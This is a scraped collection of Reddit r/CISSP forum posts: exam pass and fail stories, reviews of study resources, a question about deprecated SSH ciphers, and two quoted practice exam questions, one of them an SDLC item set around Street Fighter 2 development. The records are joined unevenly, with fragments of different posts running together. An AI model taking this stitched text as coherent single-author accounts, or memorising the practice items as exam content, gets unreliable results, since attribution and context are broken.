* Udemy.  [DigitalU.]( https://digitalu.udemy.com) So the Air Force is paying for an business license and you can use your .mil email to register and say you are in the AF. [Thor Pedersen]( https://www.udemy.com/user/thorpedersen/) covers a lot of the CISSP material.
* [O’Reilly Media.]( https://www.oreilly.com/online-learning/government.html) I had to email their customer service to get them to activate a free license for me, and that took about 7 days. Gives access to lots of free ebooks and some test, to include Sybex’s official book and practice tests.
* [Wiley.]( https://www.efficientlearning.com/) Used the free ebook from O’Reilly and registed to use Wiley’s practice engine. This is where I spent most of my time.
* [Army Ignited.]( https://www.armyignited.com/app/) Love it or hate it, this is here to stay. You will have a $4000 pool every year to use on certifications or regular Tuition Assistance. I am simplifying, but if you fail you have to pay the voucher fee back. Instead, you can enroll in a training course and get a “certification of completion” to say you have completed the course (but it just so happens to also include a voucher). And if you fail the real CISSP exam, you still pay nothing back. I did this route. I didn’t do any of the videos, just printed out the cert.  For more info about it or why, see [here]( https://www.cool.osd.mil/army/costs_and_funding/army_ca_faq.htm).
  
And there you have it--a somewhat easy guide to use for CISSP or really any certification. Also 2 other free resources I used were [Destination certification,]( https://www.youtube.com/c/DestinationCertification/playlists) which provided a decent overview/review (though I wouldn't use it for much beyond that).

3131,p1at9r,Passed CISSP exam first try with ~5 months of study,"Hey everybody,

So I've been holding off to make this post until I had received my [official pass results](https://imgur.com/bkZZkEx) and sent in my application for endorsement.  Since I sent off my application the other day, I figured it was time to share my story.  This is going to be a long one, so I'll break it up into sections so you can read what you want.

    My Exam Experience

I wanted to start with this section as I feel it's the most important.  I took my exam at a professional Pearson testing center, about 2 hours away from my home.  My exam was on a Thursday, so I took that week off of work and reviewed every day from the moment I got up to the moment I went to bed.  I would wake up, chug some coffee, get to work, and sip on GFUEL all day to keep focused.  The day of my exam, I slept in, went for a walk, went out to IHOP for breakfast, and then drove to the testing center where I was an hour early so I could find the room where the exam was and then review in my car for a bit.  Going into the exam, I did not feel prepared, or that I knew all the information needed... but I have a rule about sticking to my exam date otherwise I'll keep pushing it back.  I figured if nothing else, I was about to take a REALLY good (and expensive) practice exam.  I honestly could have probably used another month of study to feel more comfortable.

I read some study that people who take adaptive exams generally score higher if they take their time on their first 10 or so questions, so I did that.  My overall strategy was that I would plan for like 110 questions, and then probably fail.  But I wanted to take my time and thoroughly read each question.  I figured my chances of actually going up to 150 were slim.  After the first 20 or so questions, I felt like the exam was focusing on all those little protocols, frameworks, and acronyms that you generally see once in your studies and brush off as not important.  It really drilled down on topics I didn't spend a lot of time on.  I received multiple questions about SOC, and honestly I could not recall the differences at all.  Pretty sure it kept asking them because I kept getting it wrong (be sure that when it was all over, I went and studied SOC).  After about 60 questions, I felt exhausted.  I felt like most of stuff that I studied and focused on memorizing didn't show up at all.  I stressed over memorizing Common Criteria tiers just before going in... not a single question about it.  Memorized SDLC and RMF... nothing about those.  I don't want to go into further detail due to NDA, but yeah.  Overall, around question 80, I was actually getting kind of mad lol.  I felt like 80% of my questions were ""what should you do if this happens"" or ""where would you find this listed"" types of things.  Overall it seems to be less about knowledge you've studied, and more what is best for this certain situation.

I focused hard until I got up to question 100, and before I clicked the button to submit my answer, I prepared myself to have either terribly failed, or totally passed.  I didn't know which.  It seemed like either my overall train of thought was going to be correct, or it wasn't.  After question 100, I had about 40 minutes left.  I kept slogging through each additional question, expecting the exam to end.  I ended up going all the way to 150 questions and ended with just seconds to spare.  I really had to kick up my speed after the initial 100, and I did NOT expect to go to 150, and had planned my slow reading strategy based on that... oh well!  I was exhausted when the exam was over.  I took my folded printout, went to the bathroom, then got in the elevator down to the parking garage.  I opened the printout in the elevator, and saw ""Congratulations!"" on the first line.  I let out the biggest and loudest cheer in my life.  I then had to sit in my car for 20 minutes before driving home just to relax and recover from the exam.

I'd love to be able to tell you ""study this"" and ""don't study this"", but honestly from all my time on here and asking others who have taken the test, it's impossible to say what's important and what's not.  Things I was told were super important didn't show up at all, and things I was told not to focus on popped up several times.  For the first day after I passed my exam, I was actually a bit angry because I felt like I spent so many nights focusing on learning material that didn't show up at all on the exam... but I realized that they can only quiz you on so many topics with such few questions.  So I must have shown early on that I knew certain related things, and diving deeper would be pointless.

    My Previous Experience

I have my Bachelor of Science in Computer Information Technology, but I wouldn't say this was much help aside from test-taking experience/strategy.  I achieved my CCNA last year, which made Domain 4 a breeze.  I got my Security+ in January, which I think was a good stepping stone into CISSP as it covered a lot of initial topics... Basically everything you learn in Sec+ is utilized in CISSP, so I don't see a downside to taking it first.  In February and March I took the AZ-900 and AI-900 exams since I got free vouchers from Microsoft's cloud skills challenges, so that helped me introduction to cloud topics (which is about as deep as CISSP goes).

I've also been working as a ""Server & Network Administrator"", leading the Network & Security team and Helpdesk team.  I've been working here for a little over 5 years, since I was hired on to an empty team right out of college, and learned everything on my own as I went.  It's been a long journey of having to just ""figure it out"" since I didn't have a mentor or someone who could teach me.  Just lots of google, troubleshooting techniques, trial & error, and tackling problems as they came along.  My job responsibilities include creating and managing Windows servers, SAN devices, a lot of old undocumented proprietary software, automation through powershell & command prompt scripting, data backups, SQL database management, IIS, active directory, DHCP, DNS, and network device (routers, switches, etc), PCI DSS audits, etc.  Basically a jack of all trades, master of none.

Originally I was going to go down the Networking route, but for these past couple years, I've been on a daily call with our parent company's Security team, and one of them mentioned having previously worked in Networking, but moving to Security as the market was in higher demand and the pay scale was higher, which perked up my ears.  I mostly sit quietly on the call and wait for something about our office or users to be mentioned, but being able to listen to them talk smart guy stuff and go over the SIEM and other cool software has been a huge motivator.  Then they recommended I go for CISSP.

Luckily, my job responsibilities have included things such as PCI DSS and ISO audits, and generating policies and procedures (Domain 1), data encryption and access controls (Domain 2), vulnerability scanning, patching vulnerabilities, establishing virtual & physical servers, and public server cryptography (Domain 3), network device configuration and hardening as well as port security (Domain 4), active directory and user security rights management (Domain 5), and (*unfortunately*) incident response and log management (Domain 7).  Thus, while I haven't worked specifically in security, I have had a little bit of experience across a lot of things... which I thought kind of fits perfectly with the ""mile wide, inch deep"" mentality.  I wouldn't say my experience was very big, but it helped me relate certain topics to work.

    My Resources

So... I kind of get nervous when it comes to studying and try to [get every resource](https://imgur.com/utz3mdE) I can find.  Which is a bit overkill, but at least I can see what sticks with me.  Admittedly, I'm more of a visual learning than a textbook reader.

**Thor Teaches on Udemy**    
This was my main resource, and where I gained the most knowledge.  I would load up these videos whenever I could focus and stare at the screen.  I even picked up a Microsoft Wireless Display Adapter so I could cast my browser on my Surface to my TV and sit on my couch and listen.  Great content, and his notes were fantastic.  I ended up printing out all his PDF notes and putting them in sheet protectors in a binder.  The only thing that sucked is that by grouping the lessons into two-domain courses, some courses (like the one that includes D3 & D4) end up being much higher value than the ones that focus on smaller domains.  Still, I'd highly recommend the series.  9/10

**Certification Station on Discord**    
This server on Discord was fantastic.  It really kept me motivated, and helped me work through the thought process on various questions.  If you stay active in the channel, you'll end up doing hundreds of practice questions without even thinking about it.  11/10

**MindMap videos by Rob Witcher on YouTube**    
I'm pretty sure I'm responsible for hundreds of plays on these videos.  These videos became my main audio source while walking or driving to work, and I'd even listen to them as I went to sleep.  It's a great way to refresh important topics as well as quickly go over a chapter before diving into it with a main resource.  And they're free.  Not enough deep info to learn everything, but just about the perfect  review resource.  You're crazy if you don't utilize these.  10/10

**CISSP Cert Prep (2021) by Mike Chapple on LinkedIn Learning**    
Some people like Mike Chapple's teaching method, and some don't.  But his updated LinkedIn Learning videos are very well produced, and include chapter quizzes to make sure you're taking in information rather than just zoning out.  It was another source I used primarily for audio, or for getting another perspective on a confusing topic from Thor's videos.  I do think it sometimes focused on less important things and glanced over big topics, but that may be because the course is designed to go along with the Official Study Guide textbook.  7/10

**Kelly Handerhan's CISSP course on Cybrary**    
Kelly is very passionate about what she teaches, which helps keep you motivated, but this video series really lightly glosses over the information.  It can serve as a good review or refresher, but shouldn't be your main video source.  However, it's free, so still nice.  5/10

**Adam Gordon's notes**    
So everyone on Certification Station knows of Adam's notes, which are freely available on the Discord server.  They've been formatted into a nice format by some users in the server that have made reading a lot easier.  I'm not sure if his ITPro.TV course offers something nicer, but I'd say the only thing these notes lack is looking nice and organized.  Otherwise, they are FULL of information and tricks to help remember certain things.  I'd highly recommend reading through these at least once.  8/10

**ISC2 CISSP Official Study Guide (2018)**    
Honestly, I didn't use this much.  I tried to read through it, but I felt it really dragged on through certain topics.  There's no reason Domain 2 should get as many pages as it does.  After reading through a few chapters, this became more of a reference book.  I'm sure it would be great for those that can read through it in full, but I couldn't do it.  6?/10

**CISSP Study Guide (3rd Edition) by Eric Conrad**    
I picked this book up because it was shorter than the OSG.  Where the OSG wanted 140 pages for something, this book covered it in 60.  Most of the reading I did came out of this book.  I highly preferred the condensed design, but the book was certainly showing its age.  This ""latest"" edition is from 2016, and could do with some updates.  6/10

**CISSP For Dummies (6th Edition)**    
I felt this book was great!  I don't see it recommended here enough.  It's from 2018, so reasonably updated.  I didn't read it through fully, but I could see it being a very competent primary reading source.  I used it mostly for reference to double-check things that didn't make sense in my video studies, or practice questions that confused me.  The only thing really lacking in this book is that the site for redeeming the online practice exams is defunct, so you have to call their support line to get an activation code on their new site.  Not a huge issue as I didn't really use their practice questions, but a noticeable issue.  It's also still smaller than the OSG.  7/10

**11th Hour CISSP by Eric Conrad**    
This book was just ok.  I bought both the physical and Audible versions.  Some people said they used it as a review after going over everything, but I think it's too light for that.  I think it would do well as an introduction book when you're first starting your studies and want to dip your toes into each domain first over the course of 200 pages.  Nothing to really learn much info from, but a good way to understand the general topics you'll be diving into.  5/10

**The Effective CISSP by Wentz Wu**    
This book is designed to be a focus on Domain 1 and 2, with a touch of 3.  For the most part, it does that.  I was expecting it to go into further detail than what I had already learned, but that wasn't really the case.  If you've paid attention in your primary study source, this will mostly just repeat what you've already learned, but that can be nice if it's been a while since you went over these topics.  It does give a good description between various steps and such.  Is the book necessary?  Not really... but if you want to hammer in these particular domains, it's a nice addition if you have time.  7/10

**How To Think Like a Manager by Luke Ahmed**    
I'd definitely recommend this book.  It's cheap, and goes over 25 questions and the thought process you should go through.  Best of all, it goes through a VARIETY of questions you would go through, such as ""pick the best out of a list of potentially correct answers"", ""you can easily eliminate two of these"", ""the actual question is asking you for something that can specifically be answered by only one of these"", etc.  The only issue I had with the book was one question (Q14) that focused on firewall architecture ""tiers"", which is not listed in any textbook, and the only video source I could find was one by Luke, and I still couldn't determine what a ""three-tier 2"" architecture and such were.  I spent a couple hours trying to figure this out, but then all of Certification Station agreed it didn't make any sense, and wouldn't show up in the exam, which it didn't.  8/10

**CISSP Exam Guide Ultimate Edition 2021 by Walter Roberts**    
Look... Stay away from this.  It's useless.  The layout is terrible, it looks like it was typed up in Microsoft Word and printed, it skips over important information, and focuses way too heavily on stupid stuff (we don't need two pages on what Malware is).  When I was going through my CCNA studies, I found a cheap book on Amazon called ""CCNA 200-301 Quick Reference Guide"" that was like $12, and 112 pages.  It included all of the exam objectives with a brief description and notes about each objective, allowing the reader to quickly reference each objective and see if they knew the topic or needed to read more.  I was looking for a cheap book that did something similar... just a quick reference of each topic so I could determine if I've missed something.  This book was not that.  At all.  The only reason it gets any points is because it was cheap.  2/10

    Practice Exams  & Quizzes

I used a ton of practice exams and quiz sources... I used the official ISC2 practice exam book, I used CCCure, I used practice questions from all the textbooks above, I used the new Pocket Prep app (whatever it's called now), Wentz and Adam's Q of the Day, etc.  Certification Station itself is a huge conglomerate of practice questions from various sources, so its hard to tell which one was which.  I wouldn't say I went through thousands of questions like many people here... probably a total of like 500-600.  Like many people here say, the practice exams are not like the real thing.  There may be a question or two that pop in and seem similar, but generally those questions are freebie questions anyways (straight to the point definition-like questions).  What I really aimed to do was identify my weak spots and then study those sections.  For me, the new Pocket Prep app was really useful for this because it gives a readout of your proficiency in each domain so I could see which ones I was lacking, and then go back and review those.

But honestly?  Whatever you're using is probably fine.  Don't be like me and waste a huge amount of time and money trying to find the ""best"" practice exams.  There aren't any, and ISC2 send C&D's to people who create questions too similar to the real thing (like with Wentz).  So you're not going to find perfect practice questions.  Just find something that helps you pinpoint your weak spots, and then review those sections.  The best thing you can do is practice and test your knowledge, so just find something and study.  Try to use a couple resources if you can so you can get a variety.

    In Closing...

The exam was tough.  I'm still surprised I passed, but it's encouraged me to continue my studies.  I wouldn't say I'm wayyy more knowledgeable than I was before I started studying... but that may be because I had a good basepoint.  I certainly learned a few interesting and useful things, and hammered down some stuff that I lightly touched on in other certs.

I plan on taking CISM next since the material is similar.  A lot of people just said to go take a few practice exams and then take the real thing, but I want to read through a bit before taking it, as I still feel like there are some CISSP topics I'm not too familiar with.  After that, I'm hoping to either jump into CySA+ or eJPT... I just feel like I've taken a lot of certifications involving knowledge and procedures, but I still have a huge feeling of Impostor Syndrome, and I don't feel like I have as many practical skills as I'd like.  I was offered a few ""Senior Security Analyst"" positions just minutes after posting that I passed the exam, but I still feel too inexperienced.  So overall I'm trying to find something that can prepare me for a more security-centric job.

Sorry for the novel here... just trying to be thorough.",2021-08-09
3132,p18g19,"Failed, 150 Questions","Today I sat for the CISSP exam and failed at 150 questions. I scored Below Proficiency Level on 4 of the domains, and  Near Proficiency Level on the other 4. Looking at how i was graded on the test I wonder how I even made it to 150 questions(I was likely not a few questions away from passing). I mainly studied out of the Cybex book and the practice questions included, the mindmap series on YT and loosely following Kelly Handerhan on Cybrary, as well as help from you all on this subreddit!

It has discouraged me and I'm leaning towards not sitting for a retake.

3134,p0gh9k,"Passed, 100q","Been seeing a lot of ""Passed!"" posts so thought I'd throw in my experience.

Just took the exam last night and passed at 100 questions at a little over an hour.

The key takeaway I want to pass on to you if you're studying: ***you can do it!***

Personal history: I'm old enough to have 2 kids in college, been doing IT and security since my career started in 1994, and I was a computer science major.  I've been involved in SOC audits, written security policies, and consulted with lots of companies regarding how to secure IT assets properly, including extensive HIPAA consulting.  Branched out and got EnCE forensic certification in 2014 and have been doing forensics and testimony in civil cases since then in addition to the other consulting.  Lots of other certs as well, including the suite of CompTIA and Microsoft. In a word, I have experience, and I know how to take tests.

I'd thought about getting CISSP starting in about 2010 but had put it out of my mind after seeing the commitment it takes to get it, and the Shon Harris book just sat on my shelf for 10 years afterwards.  Plus, I couldn't justify the cert as bringing anything to my resume that I didn't already have.  A colleague of mine wanted CISSP really bad though, so as a challenge I told him I'd go for it too.  We could study together and push each other along.  

2021 was our year, even with the exam being updated.  He is scheduled to take his in October and I've been encouraging him to study more, but life has a way of telling you that your focus needs to be on other things like family and work.  Same applied to me, but I started just giving myself little 10 or 20 question quizzes in between other obligations, or slipping in a Youtube video or a quick read of a few pages.  Eventually the quizzes worked up into 50 questions, and then I took full on 150 question exams.

Resources that are invaluable:

* RELEVANT EXPERIENCE.  This is passable without experience, but if you have worked even tangentially to security, lean on it.
* TEST TAKING. Practice tests count for a TON and gets you in the mindset.  Don't cheat on them.  If you're struggling, make them smaller, even if it's just 1-5 questions.  Get to where you are comfortable and then work your way up.  Whether you miss a question OR EVEN IF YOU GET IT RIGHT, read the explanation and refer back to the books.  Retake missed questions.
* REDDIT. Read your colleagues' experiences, but also be aware that there are some amazing resources here, including the actual authors of study guides and books, and professional trainers.  They don't hide, and don't be afraid to reach out.
* YOUTUBE.  There's so many free videos out there, and many are wonderful at getting the fundamentals ingrained in your mind.

Things I didn't do:

* Read any book cover-to-cover.  I didn't have time or inclination.
* Keep testing myself on subjects I was already familiar with.  For example, I knew I was strong in forensics, but weak in encryption.  So I focused more on encryption until I got comfortable with it.

Specific tools I used to study:

* BOSON.  I will swear up and down that Boson is what got me through this.  They've updated to the 2021 material.  The explanations for answers are top-notch.  By test day I was scoring 95%-100% on full exams.  The only (\*tiny\*) complaint I have about it is that the online version of the test doesn't let you create a custom exam to skip questions you've already answered X number of times, which the local installation does.
* CISSPREP. I hated this test bank with a passion, because it was so hard.  I never broke about 65% on it.  However, its questions really made me think, and were not just rote memorization answers.  I can definitely see the value in the questions it asks, but that doesn't mean I enjoyed taking them.
* ALL IN ONE CISSP EXAM GUIDE, 5th edition.  This one is a carryover from 2010 but was still really helpful, particularly in how security models came to be.  I'd obviously recommend getting the latest edition, but even the older ones still have merit.
* CISSP CBK 2015.   Also older, but still has merit.  Obviously don't seek out an older CBK, but work with what you have, and if someone gifts you older books or you have something in your personal library, don't throw them out.
* Most of all, /u/benmalisow one of the aforementioned authors and trainers active on /r/cissp, who was extremely generous with his time and helpfulness.

As I said above, ***you can do it!***  

It's challenging, yes.  

It's not the hardest test I've ever taken (EnCE was exponentially harder) but I did stop at some questions and just stare at them for a couple of minutes.  Other questions I answered in about 10 seconds.

With that said, the most applicable credential to what I do now is the CISA, but everything I've heard suggests that it's not that challenging for someone with a strong auditing background.

However, I don't have a strong background in IT or good study skills, so I'm thinking that taking the Sec+ and Network+ first would make the most sense; the area I'm unfamiliar with is how much those two relate to the CISA.

After an intense 5-day training course and a week of practicing exam questions, I took and passed the CISSP exam. It took me a little over an hour before I got the notification that the test was over. I just wanted to share my experiences for anyone who is planning to take the exam.

As many have already pointed out, the real exam is quite different from the practice exams. That doesn't mean that you'd be wasting your time doing the practice exams though.

In my experience, memorizing the correct answers (from practice exams) will not help you to prepare for the real exam. However, doing the practice exams can help you to read the questions (very) carefully. Sometimes, it takes only one word to completely change the meaning of the question (and subsequently the correct answer to it). When doing practice exams, I noticed that I usually finished them a lot faster than required. This encouraged me to take my time during the real exam.

I found the questions from the real exam to be more varied and less ""gruelling"" than the practice exams. 

One piece of advice I can give you is to really take the time to read and understand the question carefully. You have more than enough time to read it multiple times but once you answer it and move to the next one, you can't go back.

Good luck with your exam!",2021-08-03

By the end of 1989, the price of ROM chips was dropping enough that Capcom game designers Akira Nishitani and Akira Yasuda began their ambitious plan for Street Fighter 2. Senior management asked the two designers to stay in-line with the original game and keep it straight forward. Management also asked for a quick turnaround to compete with other upcoming game releases such as Midway’s Mortal Kombat.

While the designers wanted to stay within the confines of the original game structure, they also wanted the freedom to try new things during development with the new ROM chips. Their goal was to create a list of skilled and iconic characters each with their own special abilities. For example, the additional memory space allowed the character Guile to have his Low Kick flipped to look like an upside-down air kick. And as Dhalsim’s limbs started getting longer and longer with each development iteration, it could be counter-balanced by making the character move slower. E. Honda’s flying attack and Chun Li’s Spinning Bird Kick were also newly added memory spaces on the ROM boards. These moves pushed the game from realistic to unrealistic, and added to its charm.

48-bits of data were allocated on the game boards to accommodate these changes.

This resulted in characters slowly increasing their assigned memory while in production and sometimes required a quick fix. In order to make these constant changes, Nishitani and Yasuda needed an accelerated development process with the final end-result already defined, but with the flexibility to allow for improvements while prototyping designs, going back and cutting animation frames for memory conservation, and re-examining system motherboard architecture. The designers needed the ability to constantly build, demonstrate, and refine their game animation changes.

Which of the following software development models would best fit this environment?

A. Waterfall method  
B. Rapid Application Development  
C. Joint Application Development  
D. Spiral Model

3160,ovz7o7,CISSP Passed in first attempt,"Hello Everyone,

I provisionally passed my CISSP exam yesterday.

The exam was Ok in the beginning and I it was brutal after 20 questions, and I never felt that I am going to Pass it. I feel it tests your patience as well during the exam.

I spent around 30 minutes for first 15 questions and started increasing my speed after 60 questions, when my exam  finished I was having 50Q and 50 minutes left.

&#x200B;

IMPORTANT \*\*\*\*\*\*\* Try to write your notes in the sequence/way that exam expects from you.. Like Advantages/disadvantages of each thing e.g. RBAC, Access models (Write them in series from Most to Least, Primary and Secondary etc.). It will help you with the exact mindset of the exam...

Reading book is very important..

&#x200B;

Resources I used:

&#x200B;

Sybex OSG 8th edition

11th hour

and Adam's Bootcamp noted from Discord

Thor's Udemy course and old question bank

Kelly's Cybrary Course to refresh the knowledge

BOSON and Sybex Official practice test (recommended)

Luke Ahmed's subscription (too much information in the questions, in exam questions are pretty small 2-3 lines max and will clear descriptions)

CISSPrep Question (not same like exam, don't take these question near to exam. If English is not your first language then it will give you some tough time, but it may improve your thinking skill)

&#x200B;

Again, This is my experience, I didn't like the lengthy questions but if it works for you then it is good else don't spend too much time and move on..

&#x200B;

One recommendation, scores of the practice questions is not relevant, I was getting 40%-50% in Luke questions, which was kind of demotivation for me, so I just completed them without looking at the result.

Still, I managed to passed at 100Q, I was still feeling that I am not fully prepared (even after passing the exam :D )... so you will be never prepared the exam....

&#x200B;

The new Questions of Sybex Official guide are better than previous version.

&#x200B;

Best of luck for your studies....

3161,ovvi01,General question about attaining the CISSP certification.,"Hello I hope you're all doing well. 

I am aware that a person who doesn’t have the required experience to become a CISSP may become an Associate of (ISC)² by successfully passing the CISSP examination and then will have six years to earn the five years experience. 


So I wanted to try to take that route and was wondering if this is a realistic route to take or is this a sector that requires solid post secondary education and solid work experience .

Thanks for the time.",2021-08-01
3162,ovu73a,Standard and safe ciphers,"
I am checking some Linux servers and can see ciphers for basically two: SSL and SSH.  For SSH I can see some deprecated ciphers like CBC, MD5, arcfour which needs to be removed. if I categorize ciphers for SSH, then they are 4 types: 1. Kex (diffie-hellman-group-exchange-sha256) 2. Server host key (rsa, dss) 3. Encryption (ctr, aes, chacha20-poly, cbc etc) 4. Mac-algorithms (hmac-sha2-256). 5 Compression (none)
1.	Could there be ciphers for other services else than SSL and SSH too that needs to be checked?
2.	Getting rid of older and deprecated ciphers (like arcfour, md5) are obvious but what about removing kex algorithm (like Diffie Helman), or Chacha20-poly etc?  Is there a standard list of ciphers for Linux servers, something recommended by NIST or else?
3. Will removing ciphers cause compatibility issues?
Thanks in advance.",2021-08-01

Boson is 99$ (75-85$ with discount) with 750 questions, while CISSPrep is 25$ with 1300 questions.

3164,ovm35i,Failed today at 150 questions,"Welp...i kinda saw that coming. I felt very unprepared the 2 weeks before the exam. The more i crammed, the less i felt like i knew. Practice tests range from 50-68%, which was discouraging. 

I have a bachelor's in business management (2011) and a masters in information technology systems (2020). I work as a research analyst for a small tech company. My everyday job isn't technical or managerial, but i have done some light technical work here and there for the company the past 9 years I've been there. I thought the test was pretty technical. Especially domain 4, my greatest nemesis. 

Started studying beginning of May. I tried to read the shon harris book, but was overwhelmed (only got through 1/2 book) At the end of may, i took a few practice tests and got around 50%. Only studied about 3hrs on a good day, much less or none on busy days. 

June, used the 11th hour to get to know the domains and then go into detail with videos, research, and shon harris book. Started doing practice test questions every other day. Was feeling better in June.... Then life happened. Didn't study for ~3 weeks. I kept thinking i had time left to study in july. 

July comes and things don't cool downwith life stuff. I was thinking of rescheduling but my mom convinced me to keep my date. It will force me to study, which i agreed with. Didn't get any better. Was only able to study everyday for ~3hr. 

Took a week off work before the exam to cram. That was the bulk of my study time, but even on the week of, i studied 5-6hr. 

I think the practice tests i used were representative of the exam. The sybex practice questions were pretty good, especially in how it is worded. The questions were similar, but the answer choices in the actual exam were more tricky.
They were not as obvious as the practice tests. I was able to narrow questions down to 2 answers. I took too much time in the beginning 50q and didn't have enough time for the rest of the test. Ended up rushing the last bit. 

Knew i failed when the last few questions were straight forward and much easier. Got a lot of legal and regulatory questions that i didn't know because glossed over those in my studies.

Study materials: 
Shon harris all in one CISSP (mostly used to do practice tests. Did ~700q)

11th hour

Sybex 3rd edition practice tests (did ~200 questions. Bought too late in July) 

Destination mind map videos (watched each vid 2x + took notes) 

Cissp cram series (watched each video 2x + followed slides)

Day before exam listed to how to think like a manager by Luke Ahmed and eric conrad's cissp cram session 

My plan for the 2nd time (hopefully last): 
Boot camp. I'm really bad with self study and need some structure. Plus, can tell people in my life i have to go to school for a chunk of time

More practice questions. Want to do all the questions i have

Look for an audio book version of a prep book 

Study things in detail. Deeper understanding of the WHY! 

TLDR: didn't study enough, didn't pass. Time management and discipline are important. Cramming didn't work :(",2021-08-01
3165,ovd9rx,PASSED AT 150,"As the title says, my heart was pounding, sweat was flowing, and the questions kept coming. last year I did 4k study questions and didn't read the book, nor had the right managerial mindset, and got to question 129 only to fail. this year I did another 4k study questions but this time instead of Sybex online exams I used cccure and actually read the book (sorta skimmed it tbh) but most importantly I had a mindset that I was there to advise and not fix, and I made sure I picked an answer that was 'end game' and that encompassed technical steps that were listed as separate answers. had to go all the way to 150 questions and completely freaked the entire time. one other difference this time was that I asked to pull my mask down while at my station so I could actually breathe normally. that helped a lot!

3171,ouob9r,Provisionally Passed Yesterday @ 150 Questions,"Hello all. I have been quietly following the CISSP reddit thread for the past two years. Before I get into the journey, I will tell you about my background. I have been in the IT industry for 15 years wearing many hats along the way. I was a managed services network engineer for most of it, although I also worked on systems and security in these roles. I was also an ISO/IT Manager for about four years in the financial industry. I am currently working as a network engineer in the media and broadcast industry. I currently hold CCNP r/S, MCSA/MCSE 2016, A+, Network+ and CISM.

&#x200B;

I have been studying for the CISSP off and on for the last two years. I was hoping to test in early 2020, but the testing centers closed for a while due to COVID. I studied the official study guide (read it cover to cover) and finished the 11th hour by Eric Conrad. This took about two weeks. I tried to read the Shon Harris edition, but I wasn't captivated by the writing style. It felt like reading a dictionary. The official guide was still a hard read, but I was able to keep up with the progression. I also used several practice tests including: the official practice tests, Boson, Shon Harris practice questions and PocketPrep. I would test myself on random questions and when I did poorly, I would review chapter material or concepts.

&#x200B;

After I learned that ISACA allowed online testing, I scheduled my CISM test for May of 2020. Unfortunately, I had technical issues logging into the exam environment so I was not able to take the test. Support did issue me a voucher to retake the exam, but I did not end up taking the exam until April 2021. Not wanting my voucher to expire, I studied the All-In-One study book for the CISM and used the QAE question bank to help (re)prepare. I thought both were essential for passing the CISM exam. I was able to pass the CISM when I took it in April 2021; thankfully I had no technical issues this time. The proctor had me scan the room, under the desk, etc. to ensure a secure test environment at home. It took about two weeks to have my work experience approved, maintenance fees, etc. until I was finally CISM certified.

&#x200B;

I told my employer about my new credentials and my interest in cybersecurity management. They requested I take the CISSP as it was viewed as a harder tested (I'll comment on that later). I ordered the ninth edition of the Official study guide and started my studies with a focused approach on my weak domains. I continued to use my practice tests to focus on these areas. I used PocketPrep and Boson for most of it. When I started using Boson, I was averaging 60-70%. After two months of studying, I was able to bring that up to 80-90% on average. I bought the CCCure questions, but only used them a few times. I heard on this forum that Boson was the best and I agree with that. I finally decided to schedule a date and get it done. I picked 7/29 as my test date and I was a nervous wreck leading up to the exam date. I felt I understudied, unprepared, etc. even though I have been studying hard for the last several months. I read the 11th hour book cover to cover to brush up on my topics. I read this until the late morning on the day of my test. My test was at 2 PM. I also watched the Kelly (Why you will pass the CISSP) video and Larry's videos and they will essential for gaining the right mindset. DON'T FIX ANYTHING!!! Cost benefit analysis for each solution. Management answers are always applicable. Focus on human life.

&#x200B;

I did a few Boson practice questions in the parking to get into the mindset of reading the questions slowly (once, twice), reading the answers slowly (once, twice). All the time to think like a manager, not an engineer. My heart rate was up and I was stressing out. I finally made my way into the testing center for the moment of truth. After the palm scans, NDA and all the processing, I finally started the exam. What I read on this forum was accurate. These were like no questions I have ever seen in my practice test bank. I had a handful that were like that, but most were scenario based. You have to completely understand the concepts and when to use them. I would read the question two or three times, figure out what they were asking and then select the appropriate or best answer. I also proved the other answers were incorrect or less accurate than the answer I chose. Several questions were way out of left field and I used an educated guess to eliminate the wrong answers. After going past 100 questions, I really thought I was headed for failure. I was thinking, all that studying and it is still not enough. I even visualized my next steps, like attending a boot camp. Nevertheless, I continued to answer each question as if it would make or break my passing grade. I finally got to question 150 with about an hour left and clicked finish exam. I was surprised it didn't have a survey like the other exams I have taken.

&#x200B;

I had to go through the checkout process (ID and palm scans again). The proctor verified my name on the printout and I noticed when she was holding it, it did not have bar graphs like I heard similar to a failure report. When she handed it to me, I saw ""Congratulations"" and said aloud, ""Well I wasn't expecting that."" haha I'm so glad I stuck with it and continued to fight for the win. I feel the networking questions pushed me over the top since that is my strongest area. I know I didn't ace it at 100 questions, but I tried my best and that is all that mattered to me. I look forward to the future this certification will bring. If anyone has tips on staying on top of the CE's, I would greatly appreciate it.

&#x200B;

I feel the CISM will help prepare you for the CISSP, but while they are similar, they are also very different. The CISM is more management focused without the high level technical knowledge required for the CISSP. Both exams were very challenging. CISM is paramount if you plan to pursue a Infosec Manager role and analyzing/reporting risk to C-level executives. There is a lot of overlap between the two, but studying for one doesn't necessarily prepare you for the other without additional study.

&#x200B;

Whatever your journey may be, I wish you all the best and I'm happy to answer any questions that do no break the NDA.

3172,ounoel,Anyone practicing with Thor Pedersen's HARD CISSP Practice Questions?,"So my company offers Udemy for Business subscriptions. Through this I have been able to obtain some CISSP resources. Some of the available resources are Thor Pederen's HARD CISSP Practice Questions. So far these are the trickiest and most confusing practice questions I have come across during my prep. Sometimes I feel like they are purposely trying to trick me by using specific words which start to make me over think. I was wondering if anyone else has been using these and if they are also finding them confusing and also wondering how similar these will be to the actual questions I will see. I have provided a sample below.

 ""J**ohn is creating a username for a new employee, Frank Hornsby. The company guidelines recommend the username ""hornsbp1"". The new employee has requested the username ""cowboy"", and there are no accounts with that name. Which username is John most likely to create, and what is the BEST reason?** ""

a. Cowboys because guidelines are optional and cowboy is unique 

b. hornsbpi, because cowboy would be too conspicuous and may attract attackers

c.  hornsbpi, because this format follows the guidelines

d. cowboyl, because this almost follows the guidelines and would not be too conspicuous

I have no factual background in IT or cybersecurity (I did get SEC+ in March). I’m an active duty Soldier who’s about to retire, and my specialty is in tactical radios and COMSEC. What probably helped me out the most was that I’d been a “manager” for almost 18 years. I do have pretty good knowledge of symmetric and asymmetric keys as a COMSEC manager, but that’s been my experience for the past 20 years.

I passed on my first attempt at 150 questions. I made sure to read everything super slow, and I took the entire three hours.

Sources I used:

Study Notes and Theory - best overall source for content. The website and Facebook group are phenomenal. 

How to Think Like a Manager by Luke Ahmed - the 25 questions helped me with the manager mindset. Excellent!

Mike Chapple’s LinkedIn course - does a great job of delivering content, then applying it to real-world scenarios 

Sybex 8th & 9th editions 
Sybex Official questions
Shon Harris AIO
Wentz Wu The Effective CISSP
11th-hour study guide
Cissprep.net questions
Destination Certification videos by Rob Witcher
Kelly Handerhan videos
Prabh Nair’s YouTube videos

I used the Pomodoro method for my study routine.

I also used Anki a lot and this subReddit group.

